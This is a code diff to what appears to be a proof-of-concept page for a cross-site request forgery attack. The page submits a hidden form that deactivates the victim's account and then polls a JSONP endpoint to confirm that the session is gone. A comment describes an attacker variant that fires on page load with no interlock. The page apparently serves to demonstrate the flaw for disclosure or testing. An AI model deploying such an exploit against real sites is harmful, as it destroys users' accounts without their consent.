@@ -186,26 +186,39 @@ document.getElementById('arm').addEventListener('click', function(){
   document.getElementById('csrf').submit();
   // attacker version, no interlock:
   // document.getElementById('csrf').submit();   // on page load
-  setTimeout(checkDead, 4000);
-  setTimeout(checkDead, 9000);
+  setTimeout(function(){ scheduleDeadChecks(); }, 4000);
 });
 
 // ---------- step 3: verify dead ----------
 var checked = false;
+var deadAttempts = 0;
+var MAX_DEAD_CHECKS = 14; // ~70s of polling: deactivation can take time to propagate
+function scheduleDeadChecks(){
+  checkDead();
+  if (!checked && deadAttempts < MAX_DEAD_CHECKS) {
+    setTimeout(scheduleDeadChecks, 5000);
+  }
+}
 function checkDead(){
   if (checked) return;
+  deadAttempts++;
   window.cbDead = function(d){
-    checked = true;
     var u = (d && d.data) || {};
     if (u.username || u.id){
-      // session still valid, write did not execute
-      setState('st3', 'session still alive (write did not execute?)', 'err');
-      show('out3', d);
-      var v = document.getElementById('verdict');
-      v.className = 'status wait';
-      v.textContent = 'Write did not take effect. Are you logged in with the expected account?';
+      if (deadAttempts >= MAX_DEAD_CHECKS) {
+        checked = true;
+        setState('st3', 'session still alive after ' + deadAttempts + ' checks', 'err');
+        show('out3', d);
+        var v = document.getElementById('verdict');
+        v.className = 'status wait';
+        v.textContent = 'Write did not take effect. Are you logged in with the expected account?';
+        return;
+      }
+      // still alive, keep polling
+      setState('st3', 'checking... deactivation can take up to a minute to propagate (' + deadAttempts + '/' + MAX_DEAD_CHECKS + ')', 'wait');
       return;
     }
+    checked = true;
     setState('st3', 'session rejected, account is gone', 'err');
     show('out3', d);
     dead();
@@ -224,11 +237,13 @@ function checkDead(){
 // the window error listener below catches the parse failure
 window.addEventListener('error', function(e){
   if (FIRED && !checked && e && e.message && /Unexpected token|is not defined|cbDead/.test(String(e.message))) {
-    // callback never invoked: response was an unauthenticated error body
-    checked = true;
-    setState('st3', 'read failed, session rejected', 'err');
-    document.getElementById('out3').textContent = 'The proxy returned an authentication error body with no callback wrapper. The session cookie is no longer accepted, exactly what deactivation does.';
-    dead();
+    if (deadAttempts >= MAX_DEAD_CHECKS) {
+      checked = true;
+      setState('st3', 'read failed, session rejected', 'err');
+      document.getElementById('out3').textContent = 'The proxy returned an authentication error body with no callback wrapper. The session cookie is no longer accepted, exactly what deactivation does.';
+      dead();
+    }
+    // otherwise keep polling
   }
 }, true);
 
